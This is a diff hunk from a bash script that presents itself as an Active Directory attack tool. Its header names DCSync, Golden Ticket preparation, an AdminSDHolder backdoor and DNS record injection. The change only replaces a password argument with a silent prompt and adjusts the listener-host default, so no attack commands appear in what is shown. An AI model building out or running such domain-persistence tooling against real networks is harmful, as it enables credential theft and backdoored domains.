@@ -4,11 +4,14 @@
 # Requires: impacket, crackmapexec, evil-winrm (all pre-installed on Kali 2025)
 # Methods: Golden Ticket prep, DCSync, AdminSDHolder backdoor, DNS record injection
 
-TARGET="${1:?Usage: $0 <dc_ip> <domain> <admin_user> <admin_pass>}"
+TARGET="${1:?Usage: $0 <dc_ip> <domain> <admin_user>}"
 DOMAIN="${2:?}"
 ADMIN="${3:?}"
-PASS="${4:?}"
-LHOST="${5:-$(hostname -I | awk '{print $1}')}"
+LHOST="${4:-$(hostname -I | awk '{print $1}')}"
+
+# Prompt for password
+read -rsp $'\033[0;36m[?]\033[0m AD admin password for '"${ADMIN}@${DOMAIN}"': ' PASS
+echo
 
 # nxc (netexec) replaced crackmapexec on Kali 2024.1+; fall back gracefully
 CME=""
